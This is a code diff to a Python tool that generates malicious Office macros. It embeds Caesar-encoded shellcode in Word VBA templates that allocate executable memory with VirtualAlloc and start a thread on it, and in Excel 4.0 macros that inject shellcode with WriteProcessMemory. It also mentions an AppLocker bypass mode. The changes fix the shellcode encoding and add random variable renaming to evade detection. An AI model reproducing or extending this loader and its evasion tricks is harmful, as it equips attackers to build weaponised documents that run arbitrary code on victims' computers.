@@ -1,4 +1,4 @@
-import os, sys, argparse, math
+import os, sys, argparse, math, string, random
 
 word_macro_caesar = """
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -27,7 +27,7 @@ Function MyMacro()
   buf = Array(%s)
   
   For i = 0 To UBound(buf) 
-    buf(i) = buf(i) - %s
+    buf(i) = (buf(i) - %s) And HFF
   Next i
   addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
   For counter = LBound(buf) To UBound(buf)
@@ -167,7 +167,7 @@ xlm4macro = """
 =REGISTER("Kernel32", "WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)
 =SELECT(R1C2:R1000:C2,R1C2)
 =SET.VALUE(R1C3,0)
-=WHILE(ACTIVE.CELL()<>"END")
+=WHILE(ACTIVE.CELL()<>"END_STRING")
 =WProcessMemory(-1,R3C1+R1C3*255,ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)
 =SET.VALUE(R1C3,R1C3+1)
 =SELECT(,"R[1]C")
@@ -186,11 +186,11 @@ def format_shellcode_caesar(shellcode, k):
     for num, byte in enumerate(shellcode):       
         if num%50 == 0 and num != 0: hshellcode += "_\n";                                                                                                                                                                                                                                                                                                                                           
         if num == 0: # first
-            hshellcode += f"{byte+2}, "
+            hshellcode += f"{(byte+k)&0xff}, "
         if num > 0 and num < code_size -2: # middle
-            hshellcode += f"{byte+2}, "
+            hshellcode += f"{(byte+k)&0xff}, "
         if num == code_size - 1: # last
-            hshellcode += f"{byte+2}"
+            hshellcode += f"{(byte+k)&0xff}"
     return hshellcode
 
 def format_shellcode_for_xlm4(shellcode):
@@ -207,6 +207,13 @@ def format_shellcode_for_xlm4(shellcode):
             hshellcode += f"CHAR({byte})" 
         if num == code_size-1: hshellcode += f"&CHAR({byte})"
     return hshellcode
+
+def rand_vars(source, *source_vars):
+    # vars can't be included in other words ie func and function or shit gets fucked up
+    letters = string.ascii_letters
+    for i in source_vars:
+        source = source.replace(i, ''.join(random.choice(letters) for i in range(random.randint(10,22))), -1)
+    return source
 
 verbose = False
 parser = argparse.ArgumentParser(description="help create office macro")
@@ -226,6 +233,7 @@ if args.type == "word_macro_caesar": # not tested yet
         data = file.read()
     e_shc = format_shellcode_caesar(data, k)
     out = word_macro_caesar % (e_shc, k)
+    rand_vars(out, "buf", "addr", "counter", "data", "res", "t1", "t2", "time")
     print(out)
 
 if args.type == "word_macro_workflow_compiler": # applocker (workflow.compiler)
@@ -314,4 +322,5 @@ if args.type == "xlm4_macro_runner":
     out = xlm4macro % (n,n)
     print(out)
     res = format_shellcode_for_xlm4(data)
+    rand_vars(out, "Valloc", "WProcessMemory", "Cthread", "Vprotect", "END_STRING")
     print(res)
